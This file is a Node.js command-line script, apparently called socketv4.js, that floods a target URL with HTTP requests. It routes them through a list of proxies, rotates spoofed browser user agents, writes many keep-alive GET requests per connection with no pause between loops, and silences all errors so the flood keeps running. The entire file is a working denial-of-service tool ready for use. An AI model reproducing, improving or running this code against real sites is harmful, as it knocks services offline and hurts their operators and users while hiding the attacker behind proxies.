require('events').EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", (e) => {});
process.on("unhandledRejection", (e) => {});

const userAgents = [
  "Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",
  "Mozilla/5.0 (X11; CrOS x86_64 13982.82.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.157 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; NOH-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; V2045) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone12,8; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
  "Mozilla/5.0 (iPhone13,3; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
  "Mozilla/5.0 (Linux; Android 10; SM-610N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
];

const fs = require("fs");

if (process.argv.length != 6)
  return console.log("node socketv4.js <host> <proxy> <time> <reqs>");

const args = {
  host: process.argv[2],
  proxy: process.argv[3],
  time: process.argv[4],
  reqs: process.argv[5],
};

const urlParsed = new URL(args.host);
const proxies = fs
  .readFileSync(args.proxy, "utf-8")
  .match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);

var genPayload = () =>
  `GET ${urlParsed.pathname} HTTP/1.1\r\nHost: ${
    urlParsed.host
  }\r\nUser-Agent: ${
    userAgents[Math.floor(Math.random() * userAgents.length)]
  }\r\nConnection: Keep-Alive\r\n\r\n`;

var payloads = [];

setInterval(() => {
  var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(":");
  var document = payloads.find((payload) => proxy[0] == payload.proxy);
  if (!document) {
    let temp = { proxy: proxy[0], payload: genPayload() };
    payloads.push(temp);
    document = temp;
  }

  var client = require("net").Socket();
  client.connect(proxy[1], proxy[0]);
  client.setTimeout(60000);

  for (var i = 0; i < args.reqs; ++i) client.write(document.payload);

  client.on("data", () => setTimeout(() => client.destroy(), 5000));
});

setTimeout(() => process.exit(0), args.time * 1000);